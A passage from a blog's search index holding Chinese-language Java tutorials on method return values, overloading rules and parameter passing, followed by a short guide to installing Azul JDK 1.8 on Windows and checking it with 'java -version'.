class="keyword">true</span> ; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getMax</span><span class="params">( <span class="keyword">int</span> a, <span class="keyword">int</span> b )</span> </span>&#123; </span><br><span class="line">  <span class="keyword">return</span> <span class="number">100</span> ; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>方法定义时return后面的返回值与方法定义上的数据类型要匹配，否则程序将报错</p></blockquote></li><li><p>调用格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">方法名 ( 参数 );</span><br><span class="line">数据类型 变量名 = 方法名 ( 参数 );</span><br></pre></td></tr></table></figure></li><li><p>范例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">isEvenNumber ( <span class="number">5</span> );</span><br><span class="line"><span class="keyword">boolean</span> flag = isEvenNumber ( <span class="number">5</span> );</span><br></pre></td></tr></table></figure><blockquote><p>方法的返回值通常会使用变量接收, 否则该返回值将毫无意义</p></blockquote></li></ul><hr><h1 id="方法的注意事项"><a href="#方法的注意事项" class="headerlink" title="方法的注意事项"></a>方法的注意事项</h1><ol><li>方法不能嵌套</li><li>void表示无返回值，可以省略return，也可以单独的书写return，后面不加数据</li></ol><hr><h1 id="方法的通用格式"><a href="#方法的通用格式" class="headerlink" title="方法的通用格式"></a>方法的通用格式</h1><ul><li><p>格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> 返回值类型 方法名(参数) &#123; </span><br><span class="line">  方法体; <span class="keyword">return</span> 数据 ; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ul><li>public static 修饰符<ul><li>返回值类型 方法操作完毕之后返回的数据的数据类型</li><li>如果方法操作完毕，没有数据返回，这里写void，而且方法体中一般不写return</li></ul></li></ul></blockquote><table><thead><tr><th>方法名</th><th>调用方法时候使用的标识</th></tr></thead><tbody><tr><td>参数</td><td>由数据类型和变量名组成，多个参数之间用逗号隔开</td></tr><tr><td>方法体</td><td>完成功能的代码块</td></tr><tr><td>return</td><td>如果方法操作完毕，有数据返回，用于把数据返回给调用者</td></tr></tbody></table></li><li><p>定义方法时要做到两个明确</p><ul><li>明确返回值类型：主要是明确方法操作完毕之后是否有数据返回，如果没有，写void；如果有，写对应的数据类型</li><li>明确参数：主要是明确参数的类型和数量</li></ul></li><li><p>调用方法时的注意:</p><ul><li>void类型方法，直接调用</li><li>非void类型的方法，推荐用变量接收调用</li></ul></li></ul><hr><h1 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h1><ul><li><p>方法重载指同一个类中定义的多个方法之间的关系，满足下列条件的多个方法相互构成重载</p></li><li><p>多个方法在同一个类中</p></li><li><p>多个方法具有相同的方法名</p></li><li><p>多个方法的参数不相同，类型不同或者数量不同</p><blockquote><ul><li>重载仅对应方法的定义，与方法的调用无关，调用方式参照标准格式</li><li>重载仅针对同一个类中方法的名称与参数进行识别，与返回值无关，换句话说不能通过返回值来判定两个方法是否相互构成重载</li></ul></blockquote></li><li><p>范例:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodDemo</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fn</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//方法体 </span></span><br><span class="line">  &#125;<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">fn</span><span class="params">(<span class="keyword">double</span> a)</span> </span>&#123; </span><br><span class="line">    <span class="comment">//方法体 </span></span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodDemo</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">float</span> <span class="title">fn</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//方法体</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">fn</span><span class="params">(<span class="keyword">int</span> a , <span class="keyword">int</span> b)</span> </span>&#123; </span><br><span class="line">    <span class="comment">//方法体 </span></span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>错误范例:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodDemo</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fn</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//方法体</span></span><br><span class="line">  &#125;<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">fn</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123; <span class="comment">/*错误原因：重载与返回值无关*/</span> </span><br><span class="line">    <span class="comment">//方法体 </span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodDemo01</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fn</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123; </span><br><span class="line">    <span class="comment">//方法体 </span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodDemo02</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">fn</span><span class="params">(<span class="keyword">double</span> a)</span> </span>&#123; <span class="comment">/*错误原因：这是两个类的两个fn方法*/</span> </span><br><span class="line">    <span class="comment">//方法体</span></span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="方法的参数传递"><a href="#方法的参数传递" class="headerlink" title="方法的参数传递"></a>方法的参数传递</h1><h2 id="参数基本类型传递"><a href="#参数基本类型传递" class="headerlink" title="参数基本类型传递"></a>参数基本类型传递</h2><ul><li><p>示例</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArgsDemo01</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number = <span class="number">100</span>; </span><br><span class="line">    System.out.println(<span class="string">&quot;调用change方法前：&quot;</span> + number);</span><br><span class="line">    change(number); System.out.println(<span class="string">&quot;调用change方法后：&quot;</span> + number); </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">int</span> number)</span> </span>&#123; </span><br><span class="line">    number = <span class="number">200</span>; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>基本数据类型的参数，形式参数的改变，不影响实际参数</p></blockquote></li></ul><h2 id="引用数据类型传递"><a href="#引用数据类型传递" class="headerlink" title="引用数据类型传递"></a>引用数据类型传递</h2><ul><li><p>示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArgsDemo02</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">int</span>[] arr = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;; </span><br><span class="line">    System.out.println(<span class="string">&quot;调用change方法前：&quot;</span> + arr[<span class="number">1</span>]); </span><br><span class="line">    change(arr); </span><br><span class="line">    System.out.println(<span class="string">&quot;调用change方法后：&quot;</span> + arr[<span class="number">1</span>]); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123; </span><br><span class="line">    arr[<span class="number">1</span>] = <span class="number">200</span>; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>对于引用类型的参数 形式参数的改变 影响实际参数的值</p></blockquote></li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java环境变量的配置</title>
      <link href="/2021/11/04/Java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"/>
      <url>/2021/11/04/Java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/</url>
      
        <content type="html"><![CDATA[<center><h1>Java的环境变量</h1></center><p><strong>操作系统：win10     64位。</strong><br><strong>Java版本是AZUL：1.8</strong></p><ol><li><p>以jdk1.8为例</p><p>根据你的电脑版本下载jdk, 选择你所需要的路径进行安装</p><ul><li>win64位的直接安装exe文件直接双击下一步安装就好了</li><li><a href="https://www.azul.com/downloads/?package=jdk">点我下载jdk1.8</a></li><li><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202110052234127.png"></li></ul></li><li><p>azul这个公司下发布的jdk是不需要搭建环境变量的</p></li></ol><ol start="3"><li><p>验证jdk的完整性</p><ol><li>打开cmd输入<code>java -version</code> 查看是否有显示版本信息</li></ol><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202110052059481.png"></p></li><li><p>完成✅</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
